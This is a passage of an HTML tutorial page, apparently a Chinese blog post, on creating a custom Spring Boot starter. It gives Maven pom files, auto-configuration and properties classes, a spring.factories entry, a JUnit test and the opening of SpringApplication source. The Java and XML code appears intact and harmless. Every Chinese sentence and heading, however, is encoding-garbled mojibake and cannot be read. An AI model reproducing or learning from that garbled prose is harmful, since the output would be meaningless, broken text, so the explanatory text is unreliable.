id="starterå¯åŠ¨åŸç†"><a href="#starterå¯åŠ¨åŸç†" class="headerlink" title="starterå¯åŠ¨åŸç†"></a>starterå¯åŠ¨åŸç†</h3><ul><li>starterçš„pom.xmlå¼•å…¥autoconfigureä¾èµ–</li></ul><pre><code class=" mermaid">graph LRA[starter] --&gt;B[autoconfigure]B --&gt; C[spring-boot-starter]</code></pre><ul><li><p>autoconfigureåŒ…ä¸­é…ç½®ä½¿ç”¨<code>META-INF/spring.factories</code>ä¸­<code>EnableAutoConfiguration</code>çš„å€¼ï¼Œä½¿å¾—é¡¹ç›®å¯åŠ¨åŠ è½½æŒ‡å®šçš„è‡ªåŠ¨é…ç½®ç±»</p></li><li><p>ç¼–å†™è‡ªåŠ¨é…ç½®ç±» <code>xxxAutoConfiguration</code> -&gt; <code>xxxxProperties</code></p></li><li><ul><li><code>@Configuration</code></li><li><code>@Conditional</code></li><li><code>@EnableConfigurationProperties</code></li><li><code>@Bean</code></li><li>â€¦â€¦</li></ul></li><li><p>å¼•å…¥starter â€” <code>xxxAutoConfiguration</code> â€” å®¹å™¨ä¸­æ”¾å…¥ç»„ä»¶ â€”- <code>ç»‘å®šxxxProperties</code> â€”- é…ç½®é¡¹</p></li></ul><h3 id="è‡ªå®šä¹‰starter"><a href="#è‡ªå®šä¹‰starter" class="headerlink" title="è‡ªå®šä¹‰starter"></a>è‡ªå®šä¹‰starter</h3><ul><li><p>ç›®æ ‡ï¼šåˆ›å»º<code>HelloService</code>çš„è‡ªå®šä¹‰starterã€‚</p></li><li><p>åˆ›å»ºä¸¤ä¸ªå·¥ç¨‹ï¼Œåˆ†åˆ«å‘½åä¸º<code>hello-spring-boot-starter</code>ï¼ˆæ™®é€šMavenå·¥ç¨‹ï¼‰ï¼Œ<code>hello-spring-boot-starter-autoconfigure</code>ï¼ˆéœ€ç”¨ç”¨åˆ°Spring Initializråˆ›å»ºçš„Mavenå·¥ç¨‹ï¼‰ã€‚</p></li><li><p><code>hello-spring-boot-starter</code>æ— éœ€ç¼–å†™ä»€ä¹ˆä»£ç ï¼Œåªéœ€è®©è¯¥å·¥ç¨‹å¼•å…¥<code>hello-spring-boot-starter-autoconfigure</code>ä¾èµ–ï¼š</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.lun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hello-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.lun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hello-spring-boot-starter-autoconfigure<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>hello-spring-boot-starter-autoconfigure</code>çš„pom.xmlå¦‚ä¸‹ï¼š</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.4.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.lun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hello-spring-boot-starter-autoconfigure<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hello-spring-boot-starter-autoconfigure<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Demo project for Spring Boot<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>åˆ›å»º4ä¸ªæ–‡ä»¶ï¼š<ul><li><code>com/lun/hello/auto/HelloServiceAutoConfiguration</code></li><li><code>com/lun/hello/bean/HelloProperties</code></li><li><code>com/lun/hello/service/HelloService</code></li><li><code>src/main/resources/META-INF/spring.factories</code></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.lun.hello.bean.HelloProperties;<br><span class="hljs-keyword">import</span> com.lun.hello.service.HelloService;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;<br><span class="hljs-keyword">import</span> org.springframework.boot.context.properties.EnableConfigurationProperties;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@ConditionalOnMissingBean(HelloService.class)</span><br><span class="hljs-meta">@EnableConfigurationProperties(HelloProperties.class)</span><span class="hljs-comment">//é»˜è®¤HelloPropertiesæ”¾åœ¨å®¹å™¨ä¸­</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServiceAutoConfiguration</span> &#123;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> HelloService <span class="hljs-title function_">helloService</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloService</span>();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;<br><br><span class="hljs-meta">@ConfigurationProperties(&quot;hello&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloProperties</span> &#123;<br>    <span class="hljs-keyword">private</span> String prefix;<br>    <span class="hljs-keyword">private</span> String suffix;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPrefix</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> prefix;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrefix</span><span class="hljs-params">(String prefix)</span> &#123;<br>        <span class="hljs-built_in">this</span>.prefix = prefix;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getSuffix</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> suffix;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSuffix</span><span class="hljs-params">(String suffix)</span> &#123;<br>        <span class="hljs-built_in">this</span>.suffix = suffix;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.lun.hello.bean.HelloProperties;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * é»˜è®¤ä¸è¦æ”¾åœ¨å®¹å™¨ä¸­</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloService</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> HelloProperties helloProperties;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String userName)</span>&#123;<br>        <span class="hljs-keyword">return</span> helloProperties.getPrefix() + <span class="hljs-string">&quot;: &quot;</span> + userName + <span class="hljs-string">&quot; &gt; &quot;</span> + helloProperties.getSuffix();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># Auto Configure</span><br><span class="hljs-attr">org.springframework.boot.autoconfigure.EnableAutoConfiguration</span>=<span class="hljs-string">\</span><br><span class="hljs-string">com.lun.hello.auto.HelloServiceAutoConfiguration</span><br></code></pre></td></tr></table></figure><ul><li><p>ç”¨mavenæ’ä»¶ï¼Œå°†ä¸¤å·¥ç¨‹installåˆ°æœ¬åœ°ã€‚</p></li><li><p>æ¥ä¸‹æ¥ï¼Œæµ‹è¯•ä½¿ç”¨è‡ªå®šä¹‰starterï¼Œç”¨Spring Initializråˆ›å»ºåä¸º<code>hello-spring-boot-starter-test</code>å·¥ç¨‹ï¼Œå¼•å…¥<code>hello-spring-boot-starter</code>ä¾èµ–ï¼Œå…¶pom.xmlå¦‚ä¸‹ï¼š</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.4.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.lun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hello-spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hello-spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Demo project for Spring Boot<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- å¼•å…¥`hello-spring-boot-starter`ä¾èµ– --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.lun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hello-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br><br></code></pre></td></tr></table></figure><ul><li>æ·»åŠ é…ç½®æ–‡ä»¶<code>application.properties</code>ï¼š</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">hello.prefix</span>=<span class="hljs-string">hello</span><br><span class="hljs-attr">hello.suffix</span>=<span class="hljs-string">666</span><br></code></pre></td></tr></table></figure><ul><li>æ·»åŠ å•å…ƒæµ‹è¯•ç±»ï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.lun.hello.service.HelloService;<span class="hljs-comment">//æ¥è‡ªè‡ªå®šä¹‰starter</span><br><span class="hljs-keyword">import</span> org.junit.jupiter.api.Assertions;<br><span class="hljs-keyword">import</span> org.junit.jupiter.api.Test;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.boot.test.context.SpringBootTest;<br><br><span class="hljs-meta">@SpringBootTest</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloSpringBootStarterTestApplicationTests</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> HelloService helloService;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextLoads</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// System.out.println(helloService.sayHello(&quot;lun&quot;));</span><br>        Assertions.assertEquals(<span class="hljs-string">&quot;hello: lun &gt; 666&quot;</span>, helloService.sayHello(<span class="hljs-string">&quot;lun&quot;</span>));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="84ã€åŸç†è§£æ-SpringApplicationåˆ›å»ºåˆå§‹åŒ–æµç¨‹"><a href="#84ã€åŸç†è§£æ-SpringApplicationåˆ›å»ºåˆå§‹åŒ–æµç¨‹" class="headerlink" title="84ã€åŸç†è§£æ-SpringApplicationåˆ›å»ºåˆå§‹åŒ–æµç¨‹"></a>84ã€åŸç†è§£æ-SpringApplicationåˆ›å»ºåˆå§‹åŒ–æµç¨‹</h2><h3 id="SpringBootå¯åŠ¨è¿‡ç¨‹"><a href="#SpringBootå¯åŠ¨è¿‡ç¨‹" class="headerlink" title="SpringBootå¯åŠ¨è¿‡ç¨‹"></a>SpringBootå¯åŠ¨è¿‡ç¨‹</h3><p>Spring Bootåº”ç”¨çš„å¯åŠ¨ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloSpringBootStarterTestApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(HelloSpringBootStarterTestApplication.class, args);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringApplication</span> &#123;<br>    <br>    ...<br>    <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ConfigurableApplicationContext <span class="hljs-title function_">run</span><span class="hljs-params">(Class&lt;?&gt; primarySource, String... args)</span> &#123;<br><span class="hljs-keyword">return</span> run(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>&lt;?&gt;[] &#123; primarySource &#125;, args);<br>&#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ConfigurableApplicationContext <span class="hljs-title function_">run</span><span class="hljs-params">(Class&lt;?&gt;[] primarySources, String[] args)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringApplication</span>(primarySources).run(args);<br>&#125;<br>    <br>    <span class="hljs-comment">//å…ˆçœ‹çœ‹new SpringApplication(primarySources)ï¼Œä¸‹ä¸€èŠ‚å†çœ‹çœ‹run()</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">SpringApplication</span><span class="hljs-params">(Class&lt;?&gt;... primarySources)</span> &#123;<br><span class="hljs-built_in">this</span>(<span class="hljs-literal">null</span>, primarySources);<br>&#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SpringApplication</span><span class="hljs-params">(ResourceLoader resourceLoader, Class&lt;?&gt;... primarySources)</span> 